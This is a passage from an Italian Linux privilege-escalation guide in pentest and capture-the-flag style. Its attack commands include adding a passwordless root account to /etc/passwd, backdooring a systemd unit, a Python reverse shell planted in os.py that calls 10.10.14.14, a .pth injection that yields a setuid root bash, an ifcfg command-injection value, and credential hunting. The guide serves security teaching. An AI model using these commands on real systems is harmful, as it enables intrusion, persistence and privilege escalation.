hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Ad esempio: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ora puoi usare il comando `su` con `hacker:hacker`

In alternativa, puoi usare le seguenti righe per aggiungere un utente fittizio senza password.\
ATTENZIONE: potresti compromettere la sicurezza attuale della macchina.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTA: sulle piattaforme BSD, `/etc/passwd` si trova in `/etc/pwd.db` e `/etc/master.passwd`; anche `/etc/shadow` viene rinominato in `/etc/spwd.db`.

Dovresti verificare se puoi **scrivere in alcuni file sensibili**. Per esempio, puoi scrivere in qualche **file di configurazione di un servizio**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Ad esempio, se la macchina esegue un server **tomcat** e puoi **modificare il file di configurazione del servizio Tomcat all'interno di /etc/systemd/,** puoi modificare le righe:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

La tua backdoor verrà eseguita al prossimo avvio di tomcat.

### Controlla le cartelle

Le seguenti cartelle potrebbero contenere backup o informazioni interessanti: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probabilmente non riuscirai a leggere l’ultima, ma prova)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Percorsi insoliti/File di proprietà

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### File modificati negli ultimi minuti

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### File DB SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Per i database applicativi leggibili, esamina i nomi delle tabelle e delle colonne alla ricerca di username e hash delle password. Trovare un hash, recuperarne la password e dimostrarne il riutilizzo per un account locale sono passaggi distinti; una stringa esadecimale generica di 32 caratteri non basta per dedurre che si tratti di MD5 o che consenta l'accesso a un account.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Se una cronologia della shell leggibile contiene un comando `sudo` seguito da una breve riga simile a una password, esamina manualmente le righe circostanti. Una password inserita nel normale prompt di `sudo` non viene salvata nella cronologia della shell; una riga successiva è solo un possibile input accidentale nella shell, non la prova di una password valida. Il marker `.sudo_as_admin_successful` registra un uso precedente, non l’autorizzazione attuale.

### File nascosti

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Script/Binari nel PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **File web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Backup**

Esamina i file leggibili nelle directory di backup e i file i cui **nomi** contengono `backup`: un archivio con un nome opaco o un'estensione crittografata può comunque esporre vecchi dati applicativi. Un archivio crittografato è solo un possibile punto di esposizione. Il recupero della password, l'ispezione dei contenuti, il recupero di un hash dell'applicazione e il riutilizzo di quella password per un account Unix sono passaggi distinti da verificare; la presenza di un hash in un archivio non dimostra che sia possibile accedere localmente.

Anche i backup leggibili delle macchine virtuali meritano lo stesso esame. Una configurazione `.vbox` di VirtualBox può indicare le immagini `.vdi` collegate e contenere metadati della chiave del disco crittografata; [VirtualBox documenta che la chiave dati crittografata è memorizzata nella configurazione della VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). La configurazione e l'immagine devono essere entrambe accessibili prima di poter esaminare il disco offline. Un volume guest può avere un proprio [livello di crittografia LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), che richiede una chiave separata. Anche dopo una decrittazione autorizzata, vecchi script o file di configurazione potrebbero contenere una password; verifica che la credenziale sia valida per un account host e che la relativa policy `sudo` consenta un comando privilegiato prima di definirlo un'escalation locale. Durante l'enumerazione passiva, inventaria i percorsi e i permessi senza copiare, decrittare o montare le immagini.

Quando esamini un archivio leggibile, elenca i nomi dei file contenuti prima di estrarre qualsiasi cosa: potrebbero esserci file di autenticazione nascosti, materiale per il recupero dei codici o chiavi SSH, anche se le copie attive sono protette. I nomi dei file indicano solo una possibile pista: verifica separatamente il materiale e l'eventuale riutilizzo dell'account.

Dai priorità agli **archivi leggibili di proprietà di un altro utente** nelle directory di backup, in particolare agli archivi di proprietà di root e a quelli accessibili tramite appartenenza a un gruppo. Un vecchio archivio può contenere un file di configurazione o un segreto di autenticazione anche quando la copia attiva è protetta. Per un'interfaccia di backup locale come [Backrest](https://garethgeorge.github.io/backrest/), controlla l'account effettivo del servizio e se un utente con privilegi inferiori può leggere la sua configurazione o autenticarsi all'interfaccia. I suoi [hooks](https://garethgeorge.github.io/backrest/docs/hooks) e la [command interface di restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) possono operare con i privilegi del daemon su file e comandi; un listener loopback, da solo, non determina l'impatto. Il `passwordBcrypt` di Backrest è un hash bcrypt codificato in base64 nel suo [codice di autenticazione](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), non una password in testo semplice. Verifica l'identità del servizio, la disponibilità di credenziali utilizzabili e l'accesso al piano o repository pertinente prima di considerare un archivio o un'interfaccia esposti come una barriera di privilegi.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### File noti che contengono password

Leggi il codice di [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): cerca **diversi file che potrebbero contenere password**.\
**Un altro strumento interessante** che puoi usare è [**LaZagne**](https://github.com/AlessandroZ/LaZagne), un'applicazione open source usata per recuperare molte password memorizzate su un computer locale, per Windows, Linux e Mac.

Se `/etc/guacamole/guacamole.properties` è leggibile, esamina le impostazioni di connessione al database `mysql-*`, `postgresql-*` o `sqlserver-*`. Se l'account è autorizzato a leggere le tabelle JDBC di Guacamole, `guacamole_connection_parameter` potrebbe contenere valori salvati per `username`, `password`, `private-key` o `passphrase` SSH. Inizia dagli ID di connessione e dai nomi dei parametri, poi esamina solo le righe pertinenti; un valore salvato potrebbe essere un token dinamico o un riferimento a un vault, anziché un segreto riutilizzabile. Consulta lo [schema JDBC di Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) e i [parametri di connessione SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Il gestore di password [pswm](https://github.com/Julynx/pswm#usage) archivia un vault cifrato, per impostazione predefinita in `~/.local/share/pswm/pswm`. Se il vault di un altro utente è visibile, controllane la proprietà e verifica se il tuo account può effettivamente leggerlo. Il solo percorso del vault non rivela le credenziali: recuperare la password master, trovare una password di account riutilizzabile e verificare i privilegi di quell'account sono passaggi distinti.

Il [database predefinito di Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) si trova in `~/.passpie/`, con un portachiavi `.keys` e file di credenziali `.pass` cifrati nelle directory dei gruppi. Una directory del database visibile è solo un indizio sul percorso: verifica di poter accedere alla chiave e alla voce cifrata pertinente, controlla se è necessaria una passphrase master e accertati che le credenziali recuperate appartengano a un account con privilegi maggiori. Passpie supporta anche [percorsi di database personalizzati](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), quindi il percorso predefinito non è esaustivo. L'enumerazione automatizzata dovrebbe elencare i metadati senza esportare credenziali né stampare materiale delle chiavi.

### Log

Se puoi leggere i log, potresti riuscire a trovare **informazioni interessanti/riservate al loro interno**. Più il log è insolito, più sarà interessante (probabilmente).\
Inoltre, alcuni **audit log** configurati in modo "**errato**" (con backdoor?) potrebbero consentirti di **registrare password** nei log di audit, come spiegato in questo post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Per poter **leggere i log, il gruppo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sarà molto utile.

### File della shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Ricerca generica di credenziali/Regex

Dovresti anche cercare file che contengono la parola "**password**" nel **nome** o nel **contenuto**, e cercare IP e indirizzi email nei log, oppure regex per gli hash.\
Non elencherò qui tutti i modi per farlo, ma se ti interessa puoi consultare gli ultimi controlli eseguiti da [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## File scrivibili

### Python library hijacking

Se sai **da dove** verrà eseguito uno script Python e **puoi scrivere in** quella cartella oppure **modificare le librerie Python**, puoi modificare la libreria OS e inserirci una backdoor (se puoi scrivere nella cartella da cui verrà eseguito lo script Python, copia e incolla la libreria os.py).

Per **inserire una backdoor nella libreria**, aggiungi semplicemente la seguente riga alla fine della libreria os.py (modifica IP e PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` scrivibile elaborato da `site.addsitedir()`

Non considerare `site.addsitedir(DIR)` equivalente a `sys.path.append(DIR)`. Elabora anche ogni file `*.pth` in `DIR`. Una riga che inizia con `import` seguito da uno spazio o una tabulazione viene eseguita come codice Python. Le righe con percorsi vengono invece risolte relativamente alla directory del sito e aggiunte solo se i percorsi esistono.<sup>[[38]](#references)</sup>

Questo può portare a una privilege escalation quando un programma Python autorizzato da sudo o comunque privilegiato chiama `site.addsitedir()` su una directory scrivibile dall'utente corrente o da uno dei suoi gruppi. Il codice `.pth` viene eseguito mentre il programma privilegiato configura il proprio percorso di importazione, prima di avviare la sua normale operazione.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Il contenuto eseguibile di `.pth` deve stare su una sola riga, ma i punti e virgola consentono di concatenare più istruzioni. Ad esempio, un percorso di esecuzione come root può creare una copia di Bash con setuid; avvia Bash con `-p` per mantenere il suo ID effettivo.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

L'opzione `-S` disabilita solo l'inizializzazione automatica di `site` da parte di Python. Non protegge un programma che importa esplicitamente `site` e chiama `site.addsitedir()`. Rimuovi i directory scrivibili da utenti malintenzionati dai percorsi di importazione privilegiati e assicurati che il directory e i relativi file `.pth` siano di proprietà e scrivibili solo dall'amministratore privilegiato.<sup>[[38]](#references)[[39]](#references)</sup>

### Exploitation di logrotate

Un job `logrotate` privilegiato può creare un percorso di scrittura file tra utenti diversi quando ruota effettivamente un log sotto un directory che un utente con privilegi inferiori può sostituire o reindirizzare durante la rotazione. Un log scrivibile è solo un indizio. Verifica la regola attiva esatta e le direttive `create`, `olddir` e `su`; l'identità effettiva dello scheduler; i permessi di scrittura e attraversamento sul directory padre del log; e se la build installata e la policy consentono di cambiare la destinazione. Una shell privilegiata successiva deve anche caricare il file risultante affinché la scrittura di un file di avvio esegua comandi. Esamina la pianificazione, la regola, la versione/il pacchetto e i metadati del percorso senza avviare una rotazione né tentare la race.

> [!TIP]
> Non considerare `3.18.0` o una stringa di versione qualsiasi come soglia assoluta per determinare la sfruttabilità. Il [changelog upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) documenta interventi di hardening su directory e symlink in più release, e le distribuzioni possono includere backport delle correzioni. Il [manuale upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) consiglia `su` quando root ruota log in directory controllati da utenti non privilegiati; verifica la regola effettiva e il comportamento reale.

Informazioni più dettagliate sulla vulnerabilità sono disponibili in questa pagina: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puoi sfruttare questa vulnerabilità con [**logrotten**](https://github.com/whotwagner/logrotten).

Questa vulnerabilità è molto simile a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log di nginx),** quindi, ogni volta che scopri di poter alterare i log, verifica chi li gestisce e se puoi aumentare i privilegi sostituendo i log con symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Riferimento della vulnerabilità:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Un file `ifcfg-*` è un indizio da esaminare se un utente con privilegi inferiori può crearlo o modificarlo **e** un percorso privilegiato di attivazione della rete leggerà proprio quel file. Verifica i permessi effettivi del file e del directory, l'interfaccia selezionata, l'implementazione installata di `ifup`/`ifdown` e chi la invoca. Un file scrivibile, da solo, non causa l'esecuzione di codice. La [guida di rete di RHEL 7 di Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue gli script di rete legacy da NetworkManager: quest'ultimo non attiva da sé i primi. La [documentazione di RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) specifica che `ifup`/`ifdown` predefiniti usano NetworkManager, mentre il pacchetto legacy opzionale fornisce script shell.

Su un sistema che usa effettivamente gli script legacy con privilegi, un'assegnazione `ifcfg-*` non quotata e interpretata dalla shell, come `NAME=`, può superare un confine di esecuzione del codice. Verifica il parser esatto, il valore e il percorso di attivazione; non dedurre che ci sia interpretazione da parte della shell dal nome del file o dalla presenza di NetworkManager. Un wrapper consentito tramite sudo che scrive l'input del chiamante in un file `ifcfg-*` e poi chiama il `ifup` legacy costituisce un percorso separato verso questo confine, anche quando il chiamante non può modificare direttamente il file.

Ad esempio: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Nota lo spazio vuoto tra Network e /bin/id_)

### **init, init.d, systemd e rc.d**

La directory `/etc/init.d` contiene gli **script** per System V init (SysVinit), il **classico sistema di gestione dei servizi Linux**. Include script per `start`, `stop`, `restart` e, talvolta, `reload` dei servizi. È possibile eseguirli direttamente o tramite i collegamenti simbolici presenti in `/etc/rc?.d/`. Nei sistemi Redhat è disponibile anche il percorso `/etc/rc.d/init.d`.

`/etc/init`, invece, è associata a **Upstart**, un sistema di **gestione dei servizi** più recente, introdotto da Ubuntu, che utilizza file di configurazione per le attività di gestione dei servizi. Nonostante la transizione a Upstart, gli script SysVinit continuano a essere utilizzati insieme alle configurazioni Upstart grazie a un livello di compatibilità di Upstart.

**systemd** è un moderno sistema di inizializzazione e gestione dei servizi, che offre funzionalità avanzate come l'avvio su richiesta dei daemon, la gestione dell'automount e le istantanee dello stato del sistema. Organizza i file in `/usr/lib/systemd/` per i pacchetti della distribuzione e in `/etc/systemd/system/` per le modifiche dell'amministratore, semplificando l'amministrazione del sistema.<sup>[[21]](#references)</sup>

## Altri trucchi

### Escalation dei privilegi NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Uscire da Shell con restrizioni


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Framework di rooting Android: abuso del canale del manager

I framework di rooting Android spesso agganciano una syscall per esporre funzionalità privilegiate del kernel a un manager in userspace. Un'autenticazione debole del manager (ad esempio, controlli della firma basati sull'ordine dei FD o schemi di password inadeguati) può consentire a un'app locale di impersonare il manager e ottenere i privilegi di root su dispositivi già sottoposti a rooting. Per saperne di più e consultare i dettagli dello sfruttamento, visita:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Individuazione dei servizi VMware Tools con LPE (CWE-426) tramite exec basato su regex (CVE-2025-41244)

L'individuazione dei servizi basata su regex in VMware Tools/Aria Operations può estrarre un percorso binario dalle righe di comando dei processi ed eseguirlo con -v in un contesto privilegiato. Pattern permissivi (ad esempio, che utilizzano \S) possono corrispondere a listener predisposti dall'attaccante in percorsi scrivibili (ad esempio, /tmp/httpd), portando all'esecuzione come root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Per saperne di più e vedere un pattern generalizzato applicabile ad altri stack di individuazione/monitoraggio, visita:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protezioni di sicurezza del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Ulteriore aiuto

[Binari statici di impacket](https://github.com/ropnop/impacket_static_binaries)

## Strumenti di Privesc per Linux/Unix

### **Miglior strumento per individuare vettori di escalation dei privilegi locali su Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opzione -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerazione delle vulnerabilità del kernel in Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accesso fisico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Raccolta di altri script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (privesc tramite Crontab UI, riutilizzo delle credenziali zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig contraffatto per un monitor eseguito da cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: aggiramento di Neighborhood Watch (hijack di sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalation dei privilegi di base su Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guida all'escalation dei privilegi su Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attacco e difesa: tecniche di escalation dei privilegi su Linux del 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nessuno si aspetta l'esecuzione di comandi!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalation dei privilegi su Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guida alle esercitazioni di laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: suggerimenti e trucchi per l'escalation dei privilegi su Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: strumento di enumerazione ed escalation dei privilegi su Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Che cos'è un socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup di Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Accedi a D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Escalation dei privilegi su Linux tramite eseguibili SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Parte 2 – Escalation dei privilegi su Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Come gestire le ACL su Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root su Redhat/CentOS tramite network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Che cos'è systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (iniezione aritmetica bash tramite log, catena completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manuale GNU Bash – BASH_ENV (file di avvio non interattivo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (privesc tramite sudo terraform dev_overrides + symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia cron pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Dagli il nome che vuoi, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalation dei privilegi tramite Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilità di escalation dei privilegi di Sudo CVE-2025-32462 e CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Directory del repository PYC](https://peps.python.org/pep-3147/)
- [32] [Documentazione di Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet di @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registrazione delle password su Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Dettagli di una race condition di logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Documentazione di Python 3.10 – `site` e file di configurazione dei percorsi](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
